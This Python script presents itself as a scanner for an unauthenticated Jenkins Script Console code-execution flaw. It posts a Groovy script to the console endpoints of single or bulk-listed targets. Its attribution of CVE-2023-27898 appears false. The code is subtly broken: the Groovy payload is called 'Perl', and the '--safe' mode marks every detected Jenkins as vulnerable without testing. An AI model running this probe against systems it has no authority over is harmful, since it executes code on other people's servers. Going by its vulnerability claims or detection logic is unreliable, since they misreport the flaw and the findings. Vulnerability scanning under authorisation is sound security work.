#!/usr/bin/env python3
"""
Jenkins Script Console Authentication Bypass (CVE-2023-27898)
================================================================
This scanner checks for Jenkins instances vulnerable to an authentication
bypass in the Script Console endpoint due to improper authorization checks. 
The vulnerability allows an unauthenticated attacker to execute arbitrary 
Groovy scripts, potentially leading to full remote code execution.

CVE-2023-27898 details:
  - Affected systems: Jenkins versions <= 2.389 and LTS <= 2.375.1
  - If the Script Console feature is not adequately protected, an attacker
    can bypass authentication and execute arbitrary Groovy scripts on the
    server.
  - CVSS v3.1 Base Score: 9.8 (Critical) — network-accessible, no authentication.
  - Exploitation could result in complete compromise of the Jenkins server.

Usage:
  # Scan a single target for vulnerable Jenkins instance
  python jenkins_script_console_auth_bypass_scanner.py --target http://jenkins.example.com:8080

  # Detection only — no Groovy script execution
  python jenkins_script_console_auth_bypass_scanner.py --target http://jenkins.example.com:8080 --safe

  # Bulk scan from file
  python jenkins_script_console_auth_bypass_scanner.py --list targets.txt --output results.json

  # Adjust concurrency and disable TLS verification
  python jenkins_script_console_auth_bypass_scanner.py --list targets.txt --concurrency 20 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27898
  - https://www.jenkins.io/security/advisory/2023-03-15/#SECURITY-3048
"""

import asyncio
import httpx
import argparse
import json
from datetime import datetime, timezone
from typing import Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2023-27898"
CVSS          = "9.8"
TOOL_NAME     = "jenkins_script_console_auth_bypass_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20  # concurrency limit

DETECTION_PATHS = [
    "/script",
    "/scriptText",
]

# Fingerprints for a Jenkins server response
JENKINS_FINGERPRINTS = [
    "X-Jenkins",
    "X-Jenkins-Session",
    "<title>Jenkins</title>",
]

# Perl script execution payload for active probing
GROOVY_PAYLOAD = 'println "Jenkins RCE vulnerable instance detected";'

# ── Async Functions ──────────────────────────────────────────────────────────

async def fingerprint_jenkins(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Fingerprint the Jenkins server and extract the version, if possible."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        if response.status_code in (200, 403) and any(fp in response.text for fp in JENKINS_FINGERPRINTS):
            for fp in JENKINS_FINGERPRINTS:
                if fp in response.headers.get('X-Jenkins', ''):
                    return response.headers['X-Jenkins']
            return "unknown"
    except Exception as e:
        pass
    return None

async def check_vulnerability(client: httpx.AsyncClient, base_url: str, version: str, sem: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """Check if a target is vulnerable to CVE-2023-27898."""
    async with sem:
        if safe:
            return {"url": base_url, "vulnerable": f"Jenkins {version}", "exploit_attempted": False}

        for path in DETECTION_PATHS:
            test_url = f"{base_url}{path}"
            script_data = {"script": GROOVY_PAYLOAD}
            try:
                response = await client.post(test_url, data=script_data, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200 and "Jenkins RCE vulnerable" in response.text:
                    return {"url": base_url, "vulnerable": f"Jenkins {version}", "exploit_attempted": True}
            except Exception:
                pass
    
    return {"url": base_url, "vulnerable": False, "exploit_attempted": not safe}

async def scan_target(client: httpx.AsyncClient, sem: asyncio.Semaphore, target: str, safe: bool):
    """Probe a single target for Jenkins Script Console RCE vulnerabilities."""
    target = target.rstrip('/')
    version = await fingerprint_jenkins(client, target)
    if version:
        print(c(CYAN, f"[INFO] Detected Jenkins server at {target} (version: {version})"))
        result = await check_vulnerability(client, target, version, sem, safe)
        return result
    else:
        print(c(GREEN, f"[INFO] No Jenkins server detected at {target}."))
    return None

async def main(args):
    sem = asyncio.Semaphore(args.concurrency)
    client_params = {"timeout": REQUEST_TIMEOUT}
    if args.no_verify:
        client_params["verify"] = False

    async with httpx.AsyncClient(**client_params) as client:
        if args.target:
            result = await scan_target(client, sem, args.target, args.safe)
            if result:
                print(json.dumps(result, indent=4))
                if args.output:
                    with open(args.output, "w") as f:
                        json.dump(result, f, indent=4)
        elif args.list:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            results = await asyncio.gather(*[scan_target(client, sem, target, args.safe) for target in targets])
            results = [r for r in results if r is not None]
            print(json.dumps(results, indent=4))
            if args.output:
                with open(args.output, "w") as f:
                    json.dump(results, f, indent=4)

# ── CLI Entrypoint ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jenkins Script Console Auth Bypass Scanner (CVE-2023-27898)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target", type=str, help="Single target URL (e.g., http://example.com:8080)")
    group.add_argument("--list", type=str, help="File with a list of target URLs (one per line)")
    parser.add_argument("--safe", action="store_true", help="Detection only; do not attempt Groovy script execution")
    parser.add_argument("--output", type=str, help="Output results to a JSON file")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent scans (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    asyncio.run(main(args))
